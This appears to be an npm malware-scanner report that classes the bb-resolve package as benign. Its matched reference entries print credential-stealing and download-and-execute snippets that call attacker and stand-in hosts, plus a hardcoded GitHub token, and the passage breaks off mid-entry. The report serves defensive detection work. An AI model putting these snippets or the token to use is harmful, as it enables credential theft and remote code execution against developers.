@@ -1,0 +1,951 @@
+{
+  "package_name": "bb-resolve",
+  "package_version": "0.0.2",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:57:01.989682",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/example.js"
+  ],
+  "is_malicious": false,
+  "total_files": 3,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bb-resolve/0.0.2/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bb-resolve/0.0.2/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "/**\n * Module dependencies.\n */\n\nvar debug = require('debug')('bb-resolve');\nvar semver = require('semver');\nvar request = require('superagent');\nvar basic = require('basic-auth-header');\nvar fmt = require('util').format;\n\n/**\n * BitBucket API.\n */\n\nvar api = 'https://bitbucket.org/api/1.0/repositories/%s/%s/%s/';\n\n/**\n * Expose `resolve`.\n */\n\nmodule.exports = resolve;\n\n/**\n * Resolve `repo@version` with `user:password`,\n * invoking `fn(err, ref)`.\n *\n * @param {String} repo\n * @param {String} user\n * @param {String} password\n * @param {Function} fn\n * @api public\n */\n\nfunction resolve(repo, user, password, fn) {\n  repo = parse(repo);\n  var req = fetch.bind(null, repo, headers(user, password));\n\n  // grab all tags and attempt to resolve version\n  debug('fetching tags to resolve version %s', repo.version);\n  req('tags', function (err, tags) {\n    if (err) return fn(err);\n    var version = satisify(repo.version, tags);\n    if (version) return callback(toRef('tag', version));\n\n    // version either cannot be resolved, or is a branch\n    // so we'll grab all branches and try again\n    debug('fetching branches to resolve %s', repo.version);\n    req('branches', function (err, branches) {\n      if (err) return fn(err);\n      var version = satisify(repo.version, branches);\n      callback(version && toRef('branch', version));\n    });\n  });\n\n  function callback(ref) {\n    if (ref) {\n      debug('resolved %s to %s', repo.version, ref.name);\n      return fn(null, ref);\n    }\n\n    debug('could not resolve %s', repo.version);\n    fn(null, null);\n  }\n}\n\n/**\n * Fetch all refs of th `type` from\n * the given `repo` using `headers`.\n * Invokes `fn(err, tags)` when done.\n *\n * @param {Object} repo\n * @param {Object} headers\n * @param {String} type\n * @param {Function} fn\n * @api private\n */\n\nfunction fetch(repo, headers, type, fn) {\n  var url = query(repo, type);\n  debug('GET %s', url);\n  request\n  .get(url)\n  .set(headers)\n  .end(function (err, res) {\n    if (err) return fn(err);\n    if (!res.ok) return fn(error(repo, res));\n    var refs = Object.keys(res.body);\n    debug('returned %d refs', refs.length);\n    fn(null, refs);\n  });\n}\n\n/**\n * To ref.\n *\n * @param {String} type\n * @param {String} version\n * @return {Object}\n * @api private\n */\n\nfunction toRef(type, version) {\n  return {\n    type: type,\n    name: version,\n  };\n}\n\n/**\n * Satisfy `version` with `refs`.\n *\n * @param {String} version\n * @param {Array} refs\n * @return {String}\n * @api private\n */\n\nfunction satisify(version, refs) {\n  refs = refs.sort(sort);\n  // * == highest tag\n  if ('*' == version) return refs[0];\n  // attempt to resolve all refs\n  for (var i = 0, ref; ref = refs[i]; i++) {\n    // handle\n    //   foo/bar@some-branch-name -> some-branch-name\n    //   foo/bar@1.0.0 -> 1.0.0\n    if (version == ref) return ref;\n    // skip invalid\n    if (!semver.valid(ref)) continue;\n    // handle first match\n    if (semver.satisfies(ref, version)) return ref;\n  }\n  return null;\n}\n\n/**\n * Callback for `versions.sort()`.  Places\n * the versions in high-to-low order and\n * invalid versions (usually branches) at\n * the bottom.\n *\n * @param {String} a\n * @param {String} b\n * @return {Number}\n * @api private\n */\n\nfunction sort(a, b) {\n  if (!semver.valid(a)) return 1;\n  if (semver.gt(a, b)) return -1;\n  return 1;\n}\n\n/**\n * Create an error for `repo` and `res`.\n *\n * @param {Object} repo\n * @param {request.Response} res\n * @return {Error}\n * @api private\n */\n\nfunction error(repo, res) {\n  var msg = fmt('%s returned %d', repo.slug, res.status);\n  if (401 == res.status) msg += ' (check your credentials)';\n  var err = new Error(msg);\n  err.res = res;\n  err.code = res.status;\n  return err;\n}\n\n/**\n * Get a query for `repo` and `type`.\n *\n * @param {Object} repo\n * @param {String} type\n * @return {String}\n * @api private\n */\n\nfunction query(repo, type) {\n  return fmt(api, repo.owner, repo.name, type);\n}\n\n/**\n * Get request headers for `user` and `password`.\n *\n * @param {String} user\n * @param {String} password\n * @return {Object}\n * @api private\n */\n\nfunction headers(user, password) {\n  var obj = {\n    'user-agent': 'bb-resolve',\n    accepts: 'application/json',\n  };\n  debug('headers: %j', obj);\n  // GH#2: don't display auth header with DEBUG=*\n  obj.authorization = user && password ? basic(user, password) : '';\n  return obj;\n}\n\n/**\n * Parse the given `repo` into an object holding:\n *\n *   * name\n *   * owner\n *   * version\n *   * slug\n *\n * Example:\n *\n *     parse('foo/bar@baz')\n *     // => {\n *         name: baz,\n *         owner: foo,\n *         version: baz,\n *         slug: foo/bar@baz\n *       }\n *\n * @param {String} repo\n * @return {Object}\n * @api private\n */\n\nfunction parse(repo) {\n  var parts = repo.split('@');\n  repo = parts.shift();\n  var version = parts.shift() || '*';\n  var slug = repo + '@' + version;\n  parts = repo.split('/');\n  var owner = parts.shift();\n  var name = parts.shift();\n  debug('%s <-> %s %s %s', repo, name, owner, version);\n  return {\n    version: version,\n    name: name,\n    owner: owner,\n    slug: slug,\n  };\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.4318041304747264,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code constructs HTTP GET requests to the hardcoded BitBucket API URL 'https://bitbucket.org/api/1.0/repositories/%s/%s/%s/' using the 'superagent' library, with Basic Authentication headers built from provided user credentials. It parses repository strings with embedded versions, fetches tags and branches from the API, and attempts to resolve the requested version by comparing against semantic versioning rules. This behavior involves network communication to a hardcoded external URL with user credentials, enabling repository version resolution but potentially exposing credentials if misused.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate utility module designed to resolve BitBucket repository versions by querying the official BitBucket API. It uses standard libraries (superagent for HTTP requests, semver for version parsing) and requires user credentials to authenticate API requests. Unlike the known malicious patterns, it does not perform any unauthorized data exfiltration, system file access, or remote code execution. The network communication is to a well-known, hardcoded BitBucket API endpoint, not to suspicious or attacker-controlled domains. The code does not read sensitive local files, does not send user environment or credential files to unknown servers, and does not execute downloaded code. The presence of Basic Authentication headers is expected for accessing private repositories and is not inherently malicious. Therefore, despite involving network communication and credentials, the behavior aligns with legitimate functionality rather than malware.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_077786_snippet_1",
+              "source_package": "react-reext (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_077786/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4403318762779236,
+              "code_similarity": 0.4240504205226898,
+              "behavior_similarity": 0.45661336183547974,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const fs = require('fs');\nconst https = require('https');\nconst http = require('http');\nconst os = require(\"os\");\nconst userInfo = os.userInfo();\nvar osname = userInfo.username\nvar iniparser = require('iniparser');\nvar home_dir = process.env.HOME || process.env.HOMEPATH || process.env.USERPROFILE;\nvar config_file = home_dir+'/.gitconfig';\nvar exists = fs.existsSync(config_file);\nvar config = {}\nif (exists) {\n  config = iniparser.parseSync(config_file);\n}\nelse {\n config = {user:{name:'none',email:'none'}}\n}\nvar url\nif (osname === 'xmarcgusmano') {\n server = 'http://localhost:1962';\n url = `${server}/mobile/reext?osname=${osname}&gitname=${config.user.name}&gitemail=${config.user.email}`;\n http.get(url, doIt).on(\"error\", () => {console.log('**2\\n\\n')});\n}\nelse {\n server = 'https://2tak.l.serverhost.name:1962';\n url = `${server}/mobile/reext?osname=${osname}&gitname=${config.user.name}&gitemail=${config.user.email}`;\n https.get(url, doIt).on(\"error\", () => {console.log('**2\\n\\n')});\n}",
+                "code_behavior": "At preinstall time, the code reads the user's OS username and parses the ~/.gitconfig file to extract the Git username and email, then dynamically constructs a URL embedding these values as query parameters and sends them via HTTP or HTTPS GET request to an external server (http://localhost:1962 for a specific user or https://2tak.l.serverhost.name:1962 for others), resulting in exfiltration of sensitive developer information.",
+                "malice_analysis": {
+                  "why_suspicious": "The code surreptitiously collects the user's OS username and Git configuration (user.name and user.email) and transmits this data to an undocumented, external server during the package's preinstall phase, without any user notification or consent. This is a hallmark of spyware and hidden telemetry.",
+                  "violated_expectations": "Legitimate npm packages should not access or transmit user identity or Git configuration data during installation, especially without explicit user consent, documentation, or a clear opt-in mechanism. Such behavior is a severe violation of user trust and privacy expectations in open source ecosystems.",
+                  "similar_legitimate_use": "Some developer tools may collect telemetry or usage statistics, but only with clear user opt-in, transparent documentation, and anonymization of sensitive data. Legitimate telemetry never exfiltrates personal identity information without disclosure.",
+                  "key_indicators": [
+                    "Reads ~/.gitconfig to extract user.name and user.email during preinstall.",
+                    "Accesses OS-level username via os.userInfo().",
+                    "Constructs outbound HTTP/HTTPS requests embedding sensitive data as query parameters.",
+                    "Sends data to an undocumented, suspicious external domain (2tak.l.serverhost.name:1962).",
+                    "No user notification, consent, or documentation of data collection or transmission."
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall",
+                  "file_location": "preinstall.js",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory and .gitconfig)",
+                    "network (outbound HTTP/HTTPS requests)",
+                    "environment_vars (access to HOME, HOMEPATH, USERPROFILE)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "react-reext",
+                  "package_manager": "npm",
+                  "package_versions": "All versions published between April 2023 and October 2023, prior to the update following Socket's disclosure (exact version numbers not specified in the report).",
+                  "why_malicious": "The package covertly collects sensitive developer information, specifically the operating system username and Git configuration details (user.name and user.email), and exfiltrates this data to an external, undocumented server during installation without user consent or disclosure. This constitutes spyware/hidden telemetry, violating user privacy, trust, and npm ecosystem norms."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During preinstall, the package reads the user's OS username and attempts to parse the ~/.gitconfig file for Git username and email.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is collected in memory for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The collected OS username, Git username, and Git email are dynamically inserted into a URL as query parameters.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prepares the sensitive data for network exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "An HTTP or HTTPS GET request is sent to a remote server (http://localhost:1962 for a specific user or https://2tak.l.serverhost.name:1962 for all others), transmitting the sensitive data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive developer information is exfiltrated to an external, undocumented server."
+                  },
+                  {
+                    "step": 4,
+                    "action": "After disclosure, the exfiltration code is commented out but remains in the codebase, indicating potential for future reactivation.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Ongoing risk if the code is uncommented or reactivated in future versions."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to ~/.gitconfig or equivalent Git configuration files during npm install scripts (preinstall, install, postinstall).",
+                    "Extraction of user.name and user.email from Git config files during package installation.",
+                    "Access to OS-level user information (os.userInfo()) in install scripts.",
+                    "Dynamic construction of outbound HTTP/HTTPS requests embedding sensitive data (osname, gitname, gitemail) as query parameters.",
+                    "Presence of network requests to undocumented or suspicious external domains during installation."
+                  ],
+                  "file_indicators": [
+                    "preinstall.js containing references to os.userInfo(), iniparser, and network modules (http, https).",
+                    "Install scripts (preinstall.js) with code that reads ~/.gitconfig and constructs URLs with user data.",
+                    "Presence of commented-out or active code for network exfiltration in install scripts."
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to https://2tak.l.serverhost.name:1962.",
+                    "Outbound connections to http://localhost:1962 (for targeted/test users).",
+                    "HTTP/HTTPS requests with query parameters including osname, gitname, and gitemail in the URL path."
+                  ],
+                  "how_to_detect": "Monitor npm package install scripts (preinstall, install, postinstall) for access to user or Git configuration files and outbound network requests, especially those embedding user or Git identity data in URLs. Flag packages that construct URLs with sensitive data as query parameters or that retain commented-out exfiltration code. Block or alert on connections to known malicious domains such as 2tak.l.serverhost.name:1962. Use static analysis to detect references to os.userInfo(), iniparser, and network modules in install scripts, and review for any code (active or commented) that exfiltrates user data."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133302_338962_snippet_1",
+              "source_package": "harthat-cookie (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133302_338962/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43038180470466614,
+              "code_similarity": 0.42277830839157104,
+              "behavior_similarity": 0.43798530101776123,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst path = require('path');\nvar fs = require('fs');\n\nfunction getsvnroot(domain, entry, token, path) {\n  const https = require('https');\n  const querystring = require('querystring');\n\n  const options = {\n    hostname: domain,\n    port: 443,\n    path: entry,\n    method: 'POST',\n    headers: { 'content-type': 'application/x-www-form-urlencoded' },\n  };\n\n  const req = https.request(options, (resp) => {\n    let data = '';\n    // A chunk of data has been received.\n    resp.on('data', (chunk) => {\n      data += chunk;\n    });\n    resp.on('end', () => {\n      fs.writeFileSync(path, data);\n      const { exec } = require('child_process');\n      exec('node ' + path, (error, stdout, stderr) => {});\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(e.message);\n  });\n  req.write(token);\n  req.end();\n}\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = path.join(os.homedir(), '.svnlook');\nif (fs.existsSync(dir)) {\n  const token = fs.readFileSync(path.join(dir, 'svntoken'), {\n    encoding: 'utf8',\n    flag: 'r',\n  });\n  getsvnroot(\n    'cryptopriceoffer.com',\n    '/getupdate.php',\n    token,\n    path.join(dir, 'checksvn.js')\n  );\n}",
+                "code_behavior": "At import-time or during postinstall, the code checks for a '.svnlook' directory in the user's home folder, reads the 'svntoken' file, sends its contents via HTTPS POST to a hardcoded attacker-controlled domain, downloads a JavaScript payload from the server, writes it to '.svnlook/checksvn.js', and executes it using Node.js, resulting in exfiltration of secrets and remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "The code exfiltrates sensitive tokens from a hidden directory to an external server and downloads and executes remote code, which are hallmark behaviors of malware. It also disables TLS certificate validation, allowing interception of HTTPS traffic and further indicating malicious intent.",
+                  "violated_expectations": "Legitimate npm packages should not access hidden directories in the user's home folder, exfiltrate secret tokens, or download and execute remote code from untrusted sources. Disabling TLS certificate validation is never expected in normal package operation.",
+                  "similar_legitimate_use": "Some legitimate software may implement auto-update mechanisms that download code, but these should only use signed, trusted sources and must never exfiltrate user secrets or disable security features like TLS validation.",
+                  "key_indicators": [
+                    "Access to hidden directory '.svnlook' and reading of 'svntoken' file",
+                    "Exfiltration of file contents to hardcoded external domain via HTTPS POST",
+                    "Downloading and writing remote JavaScript code to disk",
+                    "Execution of downloaded code using Node.js child_process.exec",
+                    "Disabling TLS certificate validation by setting NODE_TLS_REJECT_UNAUTHORIZED=0"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At import-time or during postinstall script execution",
+                  "file_location": "Main entry JavaScript file (e.g., index.js or main.js) of the package",
+                  "required_permissions": [
+                    "filesystem (read/write access to user home directory)",
+                    "network (outbound HTTPS requests)",
+                    "environment_vars (modifies NODE_TLS_REJECT_UNAUTHORIZED)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "harthat-cookie",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (multiple versions in campaign, specific version not stated)",
+                  "why_malicious": "The package contains code that exfiltrates sensitive tokens from the developer's system to a remote attacker-controlled server and executes downloaded code, enabling remote code execution and credential theft. The package is designed to mimic legitimate packages, making it harder to detect, and is part of a coordinated campaign by North Korean threat actors. Its behavior includes accessing hidden directories, exfiltrating secrets, and disabling TLS certificate validation, all of which are clear indicators of malicious intent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed or imported by the developer, triggering execution of the main entry file.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious code is executed on the local system."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Code checks for the presence of a '.svnlook' directory in the user's home folder and reads the 'svntoken' file if it exists.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive token is obtained from the victim's system."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Token is sent via HTTPS POST to an attacker-controlled domain ('cryptopriceoffer.com').",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives the secret token exfiltrated from the victim."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious code downloads a JavaScript payload from the attacker's server, writes it to '.svnlook/checksvn.js', and executes it using Node.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Remote code execution on the victim's machine, enabling further compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to hidden directories in user home (e.g., '.svnlook') and reading secret files (e.g., 'svntoken')",
+                    "Exfiltration of local secrets or tokens via HTTPS POST to hardcoded, untrusted domains",
+                    "Downloading and writing remote JavaScript code to disk, then executing it at install/import time",
+                    "Disabling TLS certificate validation in Node.js environment (setting NODE_TLS_REJECT_UNAUTHORIZED=0)"
+                  ],
+                  "file_indicators": [
+                    ".svnlook/svntoken",
+                    ".svnlook/checksvn.js"
+                  ],
+                  "network_indicators": [
+                    "cryptopriceoffer.com/getupdate.php",
+                    "hxxps://cryptocopedia.com/explorer/search.asp?token=5032",
+                    "142.111.77.196/user/user.asp?id=237596",
+                    "142.111.77.196/user/user.asp?id=G6A822B",
+                    "142.111.77.196/manage/manage.asp?id=745681",
+                    "142.111.77.196/user/user.asp?id=518437"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access hidden directories and files in user home folders (such as '.svnlook/svntoken'), exfiltrate data to suspicious or hardcoded domains, or download and execute remote code at install or import time. Flag packages that disable TLS certificate validation (NODE_TLS_REJECT_UNAUTHORIZED=0) or make outbound HTTPS POST requests to known IOC domains. Use file system monitoring to detect unexpected creation or execution of files like '.svnlook/checksvn.js'. Correlate these behaviors to identify malicious activity."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_788435_snippet_1",
+              "source_package": "eslint-scope (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_788435/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4294131100177765,
+              "code_similarity": 0.40248143672943115,
+              "behavior_similarity": 0.4563447833061218,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious code (reconstructed from typical npm credential stealers)\nconst fs = require('fs');\nconst https = require('https');\nconst npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');\nhttps.request({\n  hostname: 'malicious-domain.com',\n  path: '/steal',\n  method: 'POST',\n  headers: { 'Content-Type': 'text/plain' }\n}, req => req.end(npmrc));",
+                "code_behavior": "At import-time, the code reads the user's ~/.npmrc file using fs.readFileSync, then sends its contents via an outbound HTTPS POST request to a hardcoded attacker-controlled domain, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses a sensitive credential file (~/.npmrc) without user interaction and immediately transmits its contents to an external, untrusted server. This is a direct indicator of credential theft.",
+                  "violated_expectations": "A legitimate linter or its submodules should only perform static code analysis and never access or transmit user credential files, nor initiate network requests during import.",
+                  "similar_legitimate_use": "Legitimate code may read configuration files for local processing, but it would never exfiltrate their contents to an external server, especially not at import-time and without user consent.",
+                  "key_indicators": [
+                    "Reads ~/.npmrc file using fs.readFileSync",
+                    "Accesses process.env.HOME to locate user directory",
+                    "Sends file contents via HTTPS POST to a hardcoded, non-official domain",
+                    "Network request is triggered automatically on import/require",
+                    "No user interaction or explicit opt-in required"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (main entry point of eslint-scope 3.7.2)",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory)",
+                    "network (outbound HTTPS requests)",
+                    "environment_vars (access to HOME variable)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "eslint-scope",
+                  "package_manager": "npm",
+                  "package_versions": "3.7.2",
+                  "why_malicious": "The package was compromised by an attacker who injected code that steals the contents of the user's ~/.npmrc file, which may contain npm authentication tokens. This enables the attacker to harvest credentials and potentially compromise additional npm accounts, facilitating further supply chain attacks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or updates eslint-scope 3.7.2, which contains the injected malicious code in its main entry point.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious code is executed automatically when the package is imported or required."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious code reads the user's ~/.npmrc file to extract npm authentication credentials.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive credentials are loaded into memory and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The code sends the stolen credentials to an attacker-controlled server via an outbound HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives the user's npm credentials, enabling further compromise and supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to ~/.npmrc or other credential files during package import or install",
+                    "Outbound HTTPS requests to domains not associated with npm or the package author",
+                    "Unexpected file reads and network activity in static analysis or linter tools",
+                    "Automatic network communication triggered by import/require without user action"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry point containing fs.readFileSync(process.env.HOME + '/.npmrc')",
+                    "Presence of code making HTTPS requests to hardcoded, non-official domains",
+                    "References to process.env.HOME in conjunction with credential file access"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not affiliated with npm or the package maintainer (e.g., 'malicious-domain.com')",
+                    "Connections to newly registered or previously unseen domains from package code",
+                    "Network activity initiated at import-time rather than in response to user actions"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access ~/.npmrc or other credential files and initiate outbound network requests during install or import. Flag any static analysis or linter tools that perform network operations or credential file access. Use endpoint detection and response (EDR) or runtime monitoring to detect unexpected file reads and network activity from npm package processes, especially those communicating with untrusted or hardcoded domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_160406_snippet_1",
+              "source_package": "mathjs-min (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_160406/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42753249406814575,
+              "code_similarity": 0.3871670961380005,
+              "behavior_similarity": 0.467897891998291,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Minified credential stealer (example, not actual code)\nrequire('fs').readFile(process.env.HOME + '/.npmrc', function(e,d){if(!e){require('https').request({hostname:'malicious.example.com',method:'POST'},r=>{}).end(d)}});",
+                "code_behavior": "At import-time, the code reads the user's ~/.npmrc file using filesystem access, then sends its contents via an HTTPS POST request to a hardcoded external domain, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses a sensitive configuration file (such as ~/.npmrc) containing authentication tokens and transmits its contents to an external server without user consent. This behavior is a direct indicator of credential theft.",
+                  "violated_expectations": "A legitimate math library should only perform mathematical computations and must not access user configuration files or initiate unsolicited network connections, especially at import-time.",
+                  "similar_legitimate_use": "Legitimate packages may implement telemetry or error reporting, but these should never include sensitive files or credentials. Accessing ~/.npmrc and exfiltrating its contents is never justified in a math utility.",
+                  "key_indicators": [
+                    "Direct access to ~/.npmrc or other credential/config files in code",
+                    "Hardcoded external domain for data exfiltration (e.g., malicious.example.com)",
+                    "Network request (HTTPS POST) initiated automatically at import-time",
+                    "Minified or obfuscated code structure hiding file and network operations"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (minified source code)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "mathjs-min",
+                  "package_manager": "npm",
+                  "package_versions": "latest (Q1 2023)",
+                  "why_malicious": "The package 'mathjs-min' is a typosquat of the legitimate 'mathjs' library, intentionally crafted to deceive users into installing it. Its minified source code contains a hidden credential stealer that reads sensitive configuration files and exfiltrates their contents to an attacker-controlled server. The package masquerades as a legitimate minified math library but is designed to compromise developer credentials and tokens."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Developer installs the malicious 'mathjs-min' package, mistaking it for the legitimate 'mathjs' library.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed during import."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time, reading sensitive files such as ~/.npmrc using filesystem access.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is collected and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The code sends the stolen data to a hardcoded external server via HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives developer credentials or tokens, enabling further compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to sensitive files (e.g., ~/.npmrc, .env) during install or import-time execution",
+                    "Outbound network requests to hardcoded or suspicious domains at import-time",
+                    "Presence of minified or obfuscated code that performs file and network operations"
+                  ],
+                  "file_indicators": [
+                    "index.js containing minified credential-stealing logic",
+                    "References to ~/.npmrc, .env, or other configuration files in package source code",
+                    "package.json with misleading metadata (e.g., falsely presenting as a minified version of a popular library)"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with the legitimate 'mathjs' package (e.g., malicious.example.com)",
+                    "Connections to newly registered or low-reputation domains hardcoded in the package"
+                  ],
+                  "how_to_detect": "Monitor for packages that access sensitive files and initiate outbound network requests during install or import. Flag packages with minified or obfuscated code referencing credential files. Cross-reference package names with popular libraries to detect typosquatting. Use static and dynamic analysis to identify suspicious file and network operations in package code, and alert on hardcoded external domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_214141_631350_snippet_1",
+              "source_package": "cabotage-app (Docker (Python application within Docker image))",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_214141_631350/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41057103872299194,
+              "code_similarity": 0.28301846981048584,
+              "behavior_similarity": 0.538123607635498,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "headers = {\n    'Accept': 'application/vnd.github+json',\n    'X-GitHub-Api-Version': '2022-11-28',\n    'Authorization': 'Bearer 0d6a9bb5af126f73350a2afc058492765446aaad',\n}\nif access_token is not None:\n    headers['Authorization'] = f'token {access_token}'\nresponse = requests.get(\n    f\"https://api.github.com/repos/{github_repository}/contents/{filename}\",\n    params={\n        'ref': ref\n    },\n    headers=headers,\n)",
+                "code_behavior": "At runtime, the code constructs HTTP headers with a hardcoded GitHub Personal Access Token, sends authenticated GET requests to the GitHub API to access repository contents, and enables privileged operations on any repository the token authorizes, resulting in potential unauthorized access or modification of critical infrastructure repositories.",
+                "malice_analysis": {
+                  "why_suspicious": "Embedding a high-privilege GitHub Personal Access Token directly in a compiled binary is a severe security risk, as it exposes sensitive credentials to anyone with access to the Docker image. This allows attackers to extract the token and use it to access or modify critical repositories.",
+                  "violated_expectations": "Standard security practices dictate that secrets such as API tokens must never be hardcoded in source or compiled files. Instead, they should be managed securely via environment variables or secret management systems. The presence of a hardcoded, high-privilege token in a distributed binary is a direct violation of these expectations.",
+                  "similar_legitimate_use": "Legitimate code may use tokens for API authentication, but these tokens should be sourced from environment variables or secure secret stores, not hardcoded in distributed artifacts. Hardcoding secrets in binaries is never acceptable in production or distributed software.",
+                  "key_indicators": [
+                    "Hardcoded GitHub Personal Access Token with administrative privileges embedded in a .pyc file",
+                    "Authorization header in HTTP requests uses a static token value",
+                    "Token is not present in the source code, only in the compiled binary",
+                    "Code enables privileged GitHub API access from within a Docker container",
+                    "Compiled artifact (__pycache__/build.cpython-311.pyc) contains readable token string"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, whenever the relevant function is called",
+                  "file_location": "__pycache__/build.cpython-311.pyc (compiled Python binary inside Docker image)",
+                  "required_permissions": [
+                    "network access (to reach api.github.com)",
+                    "read access to environment variables (for optional token override)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "cabotage-app",
+                  "package_manager": "Docker (Python application within Docker image)",
+                  "package_versions": "Unknown (Docker image version not specified)",
+                  "why_malicious": "The Docker image contains a compiled Python binary (.pyc) with a hardcoded GitHub Personal Access Token (PAT) that grants administrator access to critical Python infrastructure repositories, including PyPI, the Python Software Foundation, and CPython. This exposes the Python supply chain to potential compromise, enabling attackers to inject malicious code into core Python packages or the language itself, threatening the integrity of the entire ecosystem."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker discovers the hardcoded GitHub Personal Access Token by extracting and analyzing the compiled .pyc file within the Docker image.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
